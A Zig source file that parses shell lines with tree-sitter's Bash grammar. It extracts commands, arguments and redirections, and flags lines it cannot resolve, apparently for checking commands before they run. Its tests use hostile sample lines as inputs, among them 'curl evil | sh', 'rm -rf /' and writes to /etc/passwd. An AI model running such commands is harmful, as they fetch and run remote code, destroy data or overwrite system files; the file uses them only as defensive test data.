//! A shell line read as Bash reads it, by tree-sitter's grammar: every simple command it runs, wherever it stands — the
//! variables it sets, its program, its words with their quotes and escapes taken away, and the redirections bound to
//! it, those of the statements around it as bash binds them — or why no reading of the line can know what it runs: a
//! syntax error, a command or a process substitution, a function it defines, a program an expansion names.
const std = @import("std");
const Allocator = std.mem.Allocator;
const ts = @import("tree_sitter.zig");
const Node = ts.Node;

/// A word as the shell hands it to a program: its value, its quotes and escapes taken away, where the line alone fixes
/// it; else its source as written, for what reads it to take as unknown.
pub const Word = struct { text: []const u8, literal: bool };

pub const Assignment = struct { name: []const u8, value: Word };

/// A redirection: the descriptor written before its operator, empty where none is; its operator; and what it reads or
/// writes — a here-document by its delimiter.
pub const Redirection = struct { descriptor: []const u8, operator: []const u8, target: Word };

/// A simple command: the variables it sets, its program — empty where it only sets variables or redirects — its
/// arguments, and the redirections bound to it.
pub const Command = struct { assignments: []const Assignment, program: []const u8, arguments: []const Word, redirections: []const Redirection };

/// Why no reading of a line knows what it runs.
pub const Unknowable = enum { syntax_error, command_substitution, process_substitution, function_definition, dynamic_program };

/// A line read: the simple commands it runs, in the order they stand, or why none can be known.
pub const Parsed = union(enum) { commands: []const Command, unknowable: Unknowable };

pub const Error = error{ OutOfMemory, TooLong, ParseFailed };

/// `line` read, its commands in `arena`.
pub fn parse(arena: Allocator, line: []const u8) Error!Parsed {
    const length = std.math.cast(u32, line.len) orelse return error.TooLong;
    const parser = ts.ts_parser_new() orelse return error.OutOfMemory;
    defer ts.ts_parser_delete(parser);
    if (!ts.ts_parser_set_language(parser, ts.tree_sitter_bash())) return error.ParseFailed;
    const tree = ts.ts_parser_parse_string(parser, null, line.ptr, length) orelse return error.ParseFailed;
    defer ts.ts_tree_delete(tree);
    const root = ts.ts_tree_root_node(tree);
    if (ts.ts_node_has_error(root)) return .{ .unknowable = .syntax_error };
    if (unknowableIn(root)) |why| return .{ .unknowable = why };
    var reader: Reader = .{ .arena = arena, .line = line };
    try reader.statement(root);
    if (reader.dynamic) return .{ .unknowable = .dynamic_program };
    return .{ .commands = reader.commands.items };
}

/// What, within `node`, runs what no reading of the line knows: the first substitution or function definition in it.
fn unknowableIn(node: Node) ?Unknowable {
    if (is(node, "command_substitution")) return .command_substitution;
    if (is(node, "process_substitution")) return .process_substitution;
    if (is(node, "function_definition")) return .function_definition;
    for (0..ts.ts_node_child_count(node)) |at| if (unknowableIn(ts.ts_node_child(node, @intCast(at)))) |why| return why;
    return null;
}

fn is(node: Node, kind: []const u8) bool {
    return std.mem.eql(u8, std.mem.span(ts.ts_node_type(node)), kind);
}

/// The field of `node`'s child at `at`; empty where it has none.
fn fieldOf(node: Node, at: usize) []const u8 {
    return if (ts.ts_node_field_name_for_child(node, @intCast(at))) |name| std.mem.span(name) else "";
}

/// The children of `node` that the grammar names, as an iterator gives them, with their fields.
const Named = struct {
    node: Node,
    at: usize = 0,

    const Child = struct { node: Node, field: []const u8 };

    fn next(named: *Named) ?Child {
        while (named.at < ts.ts_node_child_count(named.node)) {
            const at = named.at;
            named.at += 1;
            const child = ts.ts_node_child(named.node, @intCast(at));
            if (ts.ts_node_is_named(child)) return .{ .node = child, .field = fieldOf(named.node, at) };
        }
        return null;
    }
};

/// The first child of `node` the grammar names.
fn firstNamed(node: Node) ?Node {
    var named: Named = .{ .node = node };
    return if (named.next()) |child| child.node else null;
}

/// The first child of `node` the grammar leaves anonymous: a keyword or an operator, its source saying which.
fn firstAnonymous(node: Node) ?Node {
    for (0..ts.ts_node_child_count(node)) |at| {
        const child = ts.ts_node_child(node, @intCast(at));
        if (!ts.ts_node_is_named(child)) return child;
    }
    return null;
}

/// The commands of a line, read statement by statement.
const Reader = struct {
    arena: Allocator,
    line: []const u8,
    commands: std.ArrayList(Command) = .empty,
    /// Whether an expansion names a program.
    dynamic: bool = false,

    fn source(reader: *const Reader, node: Node) []const u8 {
        return reader.line[ts.ts_node_start_byte(node)..ts.ts_node_end_byte(node)];
    }

    /// Reads the commands a statement runs: a command; a statement with its redirections; variables set alone; else the
    /// statements within it — of a list, a pipeline, a group, a subshell, a loop or a condition — in their order.
    fn statement(reader: *Reader, node: Node) Error!void {
        if (is(node, "command")) return reader.command(node);
        if (is(node, "declaration_command") or is(node, "unset_command") or is(node, "test_command")) return reader.keywordCommand(node);
        if (is(node, "variable_assignment")) return reader.assignmentsAlone(&.{node});
        if (is(node, "variable_assignments")) {
            var assignments: std.ArrayList(Node) = .empty;
            var named: Named = .{ .node = node };
            while (named.next()) |child| try assignments.append(reader.arena, child.node);
            return reader.assignmentsAlone(assignments.items);
        }
        if (is(node, "redirected_statement")) return reader.redirected(node);
        var named: Named = .{ .node = node };
        while (named.next()) |child| try reader.statement(child.node);
    }

    fn command(reader: *Reader, node: Node) Error!void {
        var program: []const u8 = "";
        var arguments: std.ArrayList(Word) = .empty;
        var assignments: std.ArrayList(Assignment) = .empty;
        var redirections: std.ArrayList(Redirection) = .empty;
        var named: Named = .{ .node = node };
        while (named.next()) |child| {
            if (std.mem.eql(u8, child.field, "name")) {
                const name = try reader.word(firstNamed(child.node) orelse child.node);
                if (name.literal) program = name.text else reader.dynamic = true;
            } else if (std.mem.eql(u8, child.field, "argument")) {
                try arguments.append(reader.arena, try reader.word(child.node));
            } else if (std.mem.eql(u8, child.field, "redirect")) {
                try redirections.append(reader.arena, try reader.redirection(child.node));
            } else if (is(child.node, "variable_assignment")) {
                try assignments.append(reader.arena, try reader.assignment(child.node));
            }
        }
        try reader.commands.append(reader.arena, .{ .assignments = assignments.items, .program = program, .arguments = arguments.items, .redirections = redirections.items });
    }

    /// `export`, `declare`, `local`, `readonly`, `unset`, `[[` and `[`: the keyword the program, what follows its words.
    fn keywordCommand(reader: *Reader, node: Node) Error!void {
        var arguments: std.ArrayList(Word) = .empty;
        var assignments: std.ArrayList(Assignment) = .empty;
        var named: Named = .{ .node = node };
        while (named.next()) |child| {
            if (is(child.node, "variable_assignment")) {
                try assignments.append(reader.arena, try reader.assignment(child.node));
            } else try arguments.append(reader.arena, try reader.word(child.node));
        }
        const keyword = if (firstAnonymous(node)) |first| reader.source(first) else "";
        try reader.commands.append(reader.arena, .{ .assignments = assignments.items, .program = keyword, .arguments = arguments.items, .redirections = &.{} });
    }

    /// A statement that only sets variables: a command with no program.
    fn assignmentsAlone(reader: *Reader, nodes: []const Node) Error!void {
        const assignments = try reader.arena.alloc(Assignment, nodes.len);
        for (nodes, assignments) |each, *made| made.* = try reader.assignment(each);
        try reader.commands.append(reader.arena, .{ .assignments = assignments, .program = "", .arguments = &.{}, .redirections = &.{} });
    }

    /// A statement and the redirections after it, bound as bash binds them: after a list or a pipeline, to its last
    /// statement; after any other, to every command it runs, in its groups and subshells too. A here-document's line
    /// may go on: what it redirects there binds with it, the arguments there are its command's, and the pipeline or the
    /// list it goes on with binds to none of it. Redirections with no statement are a command with no program.
    fn redirected(reader: *Reader, node: Node) Error!void {
        var bound = reader.commands.items.len;
        var end = bound;
        var redirections: std.ArrayList(Redirection) = .empty;
        var arguments: std.ArrayList(Word) = .empty;
        var named: Named = .{ .node = node };
        while (named.next()) |child| {
            if (std.mem.eql(u8, child.field, "body")) {
                bound = try reader.lastStatement(child.node);
                end = reader.commands.items.len;
            } else {
                try redirections.append(reader.arena, try reader.redirection(child.node));
                if (is(child.node, "heredoc_redirect")) try reader.hereDocumentLine(child.node, &redirections, &arguments);
            }
        }
        if (end == bound) {
            try reader.commands.insert(reader.arena, bound, .{ .assignments = &.{}, .program = "", .arguments = &.{}, .redirections = &.{} });
            end = bound + 1;
        }
        for (reader.commands.items[bound..end]) |*each| each.redirections = try std.mem.concat(reader.arena, Redirection, &.{ each.redirections, redirections.items });
        const last = &reader.commands.items[end - 1];
        last.arguments = try std.mem.concat(reader.arena, Word, &.{ last.arguments, arguments.items });
    }

    /// Reads a statement after which redirections stand; the first of the commands they bind to: of a list or a
    /// pipeline, those of its last statement; of any other statement, all it runs.
    fn lastStatement(reader: *Reader, node: Node) Error!usize {
        if (!is(node, "list") and !is(node, "pipeline")) {
            const first = reader.commands.items.len;
            try reader.statement(node);
            return first;
        }
        var last = reader.commands.items.len;
        var named: Named = .{ .node = node };
        while (named.next()) |child| last = try reader.lastStatement(child.node);
        return last;
    }

    /// What a here-document's line goes on with past its delimiter: its redirections and its command's arguments, kept,
    /// and the statements it goes on to, read.
    fn hereDocumentLine(reader: *Reader, node: Node, redirections: *std.ArrayList(Redirection), arguments: *std.ArrayList(Word)) Error!void {
        var named: Named = .{ .node = node };
        while (named.next()) |child| {
            if (std.mem.eql(u8, child.field, "redirect")) {
                try redirections.append(reader.arena, try reader.redirection(child.node));
            } else if (std.mem.eql(u8, child.field, "argument")) {
                try arguments.append(reader.arena, try reader.word(child.node));
            } else if (!is(child.node, "heredoc_start") and !is(child.node, "heredoc_body") and !is(child.node, "heredoc_end") and !is(child.node, "file_descriptor")) {
                try reader.statement(child.node);
            }
        }
    }

    fn redirection(reader: *Reader, node: Node) Error!Redirection {
        var made: Redirection = .{ .descriptor = "", .operator = if (firstAnonymous(node)) |operator| reader.source(operator) else "", .target = .{ .text = "", .literal = true } };
        var named: Named = .{ .node = node };
        while (named.next()) |child| {
            if (is(child.node, "file_descriptor")) {
                made.descriptor = reader.source(child.node);
            } else if (is(child.node, "heredoc_start")) {
                made.target = .{ .text = std.mem.trim(u8, reader.source(child.node), "'\""), .literal = true };
            } else if (std.mem.eql(u8, child.field, "destination") or is(node, "herestring_redirect")) {
                made.target = try reader.word(child.node);
            }
        }
        return made;
    }

    fn assignment(reader: *Reader, node: Node) Error!Assignment {
        var made: Assignment = .{ .name = "", .value = .{ .text = "", .literal = true } };
        var named: Named = .{ .node = node };
        while (named.next()) |child| {
            if (std.mem.eql(u8, child.field, "name")) made.name = reader.source(child.node);
            if (std.mem.eql(u8, child.field, "value")) made.value = try reader.word(child.node);
        }
        return made;
    }

    /// A word's value, its quotes and escapes taken away, where the line alone fixes it: a bare word with no pattern
    /// and no leading `~`, a number, a name, a single-quoted string, a double-quoted one that expands nothing, and what
    /// is made of such alone; else its source.
    fn word(reader: *Reader, node: Node) Error!Word {
        const written = reader.source(node);
        const unknown: Word = .{ .text = written, .literal = false };
        if (is(node, "number") or is(node, "variable_name")) return .{ .text = written, .literal = true };
        if (is(node, "raw_string")) return .{ .text = written[1 .. written.len - 1], .literal = true };
        if (is(node, "word")) {
            if (std.mem.indexOfAny(u8, written, "*?[") != null or std.mem.startsWith(u8, written, "~")) return unknown;
            return .{ .text = try unescaped(reader.arena, written, .any), .literal = true };
        }
        if (is(node, "string")) {
            var value: std.ArrayList(u8) = .empty;
            var named: Named = .{ .node = node };
            while (named.next()) |child| {
                if (!is(child.node, "string_content")) return unknown;
                try value.appendSlice(reader.arena, try unescaped(reader.arena, reader.source(child.node), .double_quoted));
            }
            return .{ .text = value.items, .literal = true };
        }
        if (is(node, "concatenation")) {
            var value: std.ArrayList(u8) = .empty;
            for (0..ts.ts_node_child_count(node)) |at| {
                const part = try reader.word(ts.ts_node_child(node, @intCast(at)));
                if (!part.literal) return unknown;
                try value.appendSlice(reader.arena, part.text);
            }
            return .{ .text = value.items, .literal = true };
        }
        return unknown;
    }
};

/// Which characters a backslash takes away before: any, as outside quotes; or `\`, `"`, `$` and `` ` `` alone, as
/// within double quotes. Before a newline it is taken away with it, as a line goes on.
const Escapes = enum { any, double_quoted };

fn unescaped(arena: Allocator, text: []const u8, escapes: Escapes) error{OutOfMemory}![]const u8 {
    if (std.mem.indexOfScalar(u8, text, '\\') == null) return text;
    var value: std.ArrayList(u8) = .empty;
    var at: usize = 0;
    while (at < text.len) : (at += 1) {
        if (text[at] == '\\' and at + 1 < text.len) {
            const next = text[at + 1];
            const taken = next == '\n' or escapes == .any or std.mem.indexOfScalar(u8, "\\\"$`", next) != null;
            if (taken) {
                if (next != '\n') try value.append(arena, next);
                at += 1;
                continue;
            }
        }
        try value.append(arena, text[at]);
    }
    return value.items;
}

/// The programs of `parsed`'s commands, for the tests.
fn programsOf(arena: Allocator, parsed: Parsed) ![]const []const u8 {
    const programs = try arena.alloc([]const u8, parsed.commands.len);
    for (parsed.commands, programs) |each, *program| program.* = each.program;
    return programs;
}

test "a line's simple commands come with the variables they set, their programs and their words unquoted" {
    var arena_state: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    const parsed = try parse(arena, "FOO=1 git commit -m \"fix: it's \\$done\" 'single' esc\\ aped a\"b\"'c' && npm test | tee out.log; echo hi &");
    try std.testing.expectEqualDeep(@as([]const []const u8, &.{ "git", "npm", "tee", "echo" }), try programsOf(arena, parsed));
    const git = parsed.commands[0];
    try std.testing.expectEqualStrings("FOO", git.assignments[0].name);
    try std.testing.expectEqualStrings("1", git.assignments[0].value.text);
    const words = [_][]const u8{ "commit", "-m", "fix: it's $done", "single", "esc aped", "abc" };
    for (words, git.arguments) |expected, argument| {
        try std.testing.expect(argument.literal);
        try std.testing.expectEqualStrings(expected, argument.text);
    }
    // Keywords are their commands' programs; variables set alone are a command with none.
    const keywords = try parse(arena, "export A=1 B; [[ -f x ]] && unset Y; X=1 Y=2; \"git\" status");
    try std.testing.expectEqualDeep(@as([]const []const u8, &.{ "export", "[[", "unset", "", "git" }), try programsOf(arena, keywords));
    try std.testing.expectEqualStrings("A", keywords.commands[0].assignments[0].name);
    try std.testing.expectEqual(@as(usize, 2), keywords.commands[3].assignments.len);
    // Commands in loops and conditions are read too; a word the shell expands is given as written.
    const looped = try parse(arena, "for f in *.txt; do wc -l \"$f\" ~/x; done; if true; then echo a; fi");
    try std.testing.expectEqualDeep(@as([]const []const u8, &.{ "wc", "true", "echo" }), try programsOf(arena, looped));
    try std.testing.expect(!looped.commands[0].arguments[1].literal);
    try std.testing.expectEqualStrings("\"$f\"", looped.commands[0].arguments[1].text);
    try std.testing.expect(!looped.commands[0].arguments[2].literal);
}

test "a redirection binds as bash binds it: after a list or a pipeline to its last statement, else to all it runs" {
    var arena_state: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    const listed = try parse(arena, "npm install x && git push origin main 2>&1 | tee build.log > out.txt");
    try std.testing.expectEqual(@as(usize, 0), listed.commands[0].redirections.len);
    try std.testing.expectEqualStrings("2", listed.commands[1].redirections[0].descriptor);
    try std.testing.expectEqualStrings(">&", listed.commands[1].redirections[0].operator);
    try std.testing.expectEqualStrings("1", listed.commands[1].redirections[0].target.text);
    try std.testing.expectEqualStrings("out.txt", listed.commands[2].redirections[0].target.text);
    for ([_][]const u8{ "(echo x; echo y) > /etc/passwd", "{ echo x; echo y; } > /etc/passwd" }) |line| {
        const grouped = try parse(arena, line);
        try std.testing.expectEqual(@as(usize, 2), grouped.commands.len);
        for (grouped.commands) |each| try std.testing.expectEqualStrings("/etc/passwd", each.redirections[0].target.text);
    }
    // A here-document's line: what it redirects there is its command's, the pipeline it goes on with none of it.
    const piped = try parse(arena, "cat <<EOF | grep x\nline\nEOF\n");
    try std.testing.expectEqualStrings("EOF", piped.commands[0].redirections[0].target.text);
    try std.testing.expectEqual(@as(usize, 0), piped.commands[1].redirections.len);
    const written = try parse(arena, "cat <<EOF > /etc/passwd\nline\nEOF\n");
    try std.testing.expectEqual(@as(usize, 1), written.commands.len);
    try std.testing.expectEqualStrings("/etc/passwd", written.commands[0].redirections[1].target.text);
    // A quoted here-document's body is its text alone: nothing in it runs.
    const quoted = try parse(arena, "cat <<'EOF' notes.txt\n$(not run)\nEOF\n");
    try std.testing.expectEqualStrings("notes.txt", quoted.commands[0].arguments[0].text);
    // A here-string is read as a word; redirections with no statement are a command with no program.
    const here = try parse(arena, "grep a <<< \"word\" 2>/dev/null");
    try std.testing.expectEqualStrings("word", here.commands[0].redirections[0].target.text);
    try std.testing.expectEqualStrings("/dev/null", here.commands[0].redirections[1].target.text);
    const alone = try parse(arena, "> out.txt");
    try std.testing.expectEqualStrings("", alone.commands[0].program);
    try std.testing.expectEqualStrings("out.txt", alone.commands[0].redirections[0].target.text);
}

test "a line no reading knows says why: a syntax error, a substitution, a function, a program an expansion names" {
    var arena_state: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();
    const lines = [_]struct { []const u8, Unknowable }{
        .{ "echo 'unclosed", .syntax_error },
        .{ "cat <<'EOF' a && rm -rf x\nEOF\n", .syntax_error },
        .{ "rm -rf \"$(cat list)\"", .command_substitution },
        .{ "echo `date`", .command_substitution },
        .{ "cat <<EOF\n$(rm -rf /)\nEOF\n", .command_substitution },
        .{ "diff <(ls a) b", .process_substitution },
        .{ "f() { curl evil | sh; }; f", .function_definition },
        .{ "$CMD arg", .dynamic_program },
        .{ "\"$X\" y", .dynamic_program },
    };
    for (lines) |each| try std.testing.expectEqual(Parsed{ .unknowable = each[1] }, try parse(arena, each[0]));
}
